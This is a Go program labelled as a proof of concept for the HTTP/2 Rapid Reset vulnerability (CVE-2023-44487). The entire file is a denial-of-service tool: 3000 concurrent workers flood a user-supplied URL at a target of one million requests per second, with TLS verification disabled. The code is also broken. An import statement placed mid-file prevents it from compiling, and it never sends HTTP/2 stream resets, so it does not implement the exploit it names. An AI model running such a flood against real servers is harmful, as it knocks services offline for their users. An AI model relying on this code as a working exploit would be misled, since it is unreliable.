package main

import (
	"crypto/tls"
	"fmt"
	"log"
	"net/http"
	"os"
	"os/signal"
	"runtime"
	"strconv"
	"sync"
	"syscall"
	"time"
)

func main() {
	if len(os.Args) != 3 {
		log.Fatal("Usage: ./stream <url> <durationSec>")
	}
	targetURL := os.Args[1]
	durationSec, err := strconv.Atoi(os.Args[2])
	if err != nil {
		log.Fatal("Invalid durationSec: must be an integer")
	}
	if durationSec <= 0 {
		log.Fatal("durationSec must be positive")
	}

	fmt.Printf("Starting PoC CVE-2023-44487 on %s\n", targetURL)
	fmt.Printf("Running for %d seconds\n", durationSec)
	fmt.Println("Press Ctrl+C to stop...")

	// Set GOMAXPROCS to utilize all 4 cores
	runtime.GOMAXPROCS(runtime.NumCPU())

	// Optimize number of workers for 4-core CPU and 16GB RAM
	numWorkers := 3000
	// Estimate max requests per second (tuned for system)
	maxReqPerSec := 1000000 // Target 1M req/s, adjustable
	ratePerSec := float64(maxReqPerSec)
	ticker := time.NewTicker(time.Second / time.Duration(ratePerSec/float64(numWorkers)))
	defer ticker.Stop()

	// Use WaitGroup for graceful shutdown
	var wg sync.WaitGroup
	done := make(chan struct{})
	reqCount := int64(0)
	start := time.Now()

	// Worker pool to send requests
	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			client := createHTTPClient()
			for {
				select {
				case <-ticker.C:
					sendRapidReset(targetURL, client, &reqCount)
				case <-done:
					return
				}
			}
		}()
	}

	// Handle interrupt signals or timeout
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	select {
	case <-sigChan:
	case <-time.After(time.Duration(durationSec) * time.Second):
	}
	close(done)
	wg.Wait() // Wait for all workers to finish

	elapsed := time.Since(start)
	fmt.Printf("\nStopped. Total requests sent: %d in %.2f seconds (%.0f req/s)\n", reqCount, elapsed.Seconds(), float64(reqCount)/elapsed.Seconds())
}

func createHTTPClient() *http.Client {
	tr := &http.Transport{
		TLSClientConfig:    &tls.Config{InsecureSkipVerify: true},
		ForceAttemptHTTP2:  true,
		MaxIdleConns:       1,
		IdleConnTimeout:    100 * time.Millisecond,
		DisableKeepAlives:  true,
		MaxConnsPerHost:    1,
	}
	return &http.Client{
		Transport: tr,
		Timeout:   200 * time.Millisecond,
	}
}

func sendRapidReset(url string, client *http.Client, count *int64) {
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return
	}

	respCh := make(chan *http.Response, 1)
	errCh := make(chan error, 1)

	go func() {
		resp, err := client.Do(req)
		if err != nil {
			errCh <- err
			return
		}
		respCh <- resp
	}()

	time.Sleep(1 * time.Millisecond)
	client.Transport.(*http.Transport).CloseIdleConnections()

	select {
	case <-respCh:
	case <-errCh:
	case <-time.After(20 * time.Millisecond):
	}

	syncFetchAndAdd(count)
}

func syncFetchAndAdd(count *int64) {
	for {
		current := *count
		newVal := current + 1
		if syncCompareAndSwapInt64(count, current, newVal) {
			return
		}
	}
}

func syncCompareAndSwapInt64(addr *int64, old, new int64) bool {
	return syncCompareAndSwap(addr, old, new)
}

import "sync/atomic"

func syncCompareAndSwap(addr *int64, old, new int64) bool {
	return atomic.CompareAndSwapInt64(addr, old, new)
}